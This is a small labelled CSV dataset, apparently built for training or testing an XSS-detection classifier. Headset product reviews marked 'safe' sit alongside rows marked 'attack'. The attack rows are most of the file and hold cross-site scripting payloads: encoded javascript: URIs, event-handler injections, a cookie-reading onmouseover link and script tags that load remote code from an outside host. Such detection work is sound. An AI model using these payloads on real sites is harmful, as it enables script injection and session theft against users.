,label,sentence
0,attack,"<img lowsrc=""javascript:alert('xss')"">"
1,attack,"\"";alert('xss');//"
2,attack,<script src=http://ha.ckers.org/xss.js></script>
3,attack,"<iMg LOwSrc=""JaVaSCripT:alerT('Xss')"">"
4,safe,Excellent dual-purpose headset.
5,attack,"<IMG SRC=""LIVESCRIPT:[CODE]"">"
6,safe,If I take a picture. the battery drops a bar. and starts beeping. letting me know its dieing.
7,attack,"<IMG SRC="" &#14;  JAVASCRIPT:ALERT('XSS');"">"
8,safe,I can hear while I'm driving in the car. and usually don't even have to put it on it's loudest setting.
9,attack,"<img src=/ onerror=""alert(string.fromcharcode(88.83.83))""></img>"
10,attack,"<IMG DYNSRC=""JAVASCRIPT:ALERT('XSS')"">"
11,attack,"<script/src=""http://ha.ckers.org/xss.js""></script>"
12,attack,<body onload=alert('xss')>
13,attack,<SCRIPT SRC=HTTP://HA.CKERS.ORG/XSS.JS></SCRIPT>
14,attack,"<IMG SRC=""JAV&#X0A;ASCRIPT:ALERT('XSS');"">"
15,attack,<iframe src=http://ha.ckers.org/scriptlet.html <
16,attack,"<img src=""javascript:alert('xss')"""
17,safe,Best headset ever!!!.
18,attack,"</title><script>alert(""xss"");</script>"
19,attack,<IMG SRC=JAVASCRIPT:ALERT('XSS')>
20,attack,"<INPUT TYPE=""IMAGE"" SRC=""JAVASCRIPT:ALERT('XSS');"">"
21,attack,<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
22,attack,<A ONMOUSEOVER=ALERT(DOCUMENT.COOKIE)>XXS LINK</A>
23,attack,"<IMg SRc=""JaV&#X0A;asCRiPT:AleRt('xsS');"">"
24,attack,"<img src=""jav&#x0a;ascript:alert('xss');"">"
25,attack,<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
26,attack,<IMG SRc=jAVAscRIPT:aleRt(strInG.fROmCharcodE(88.83.83))>
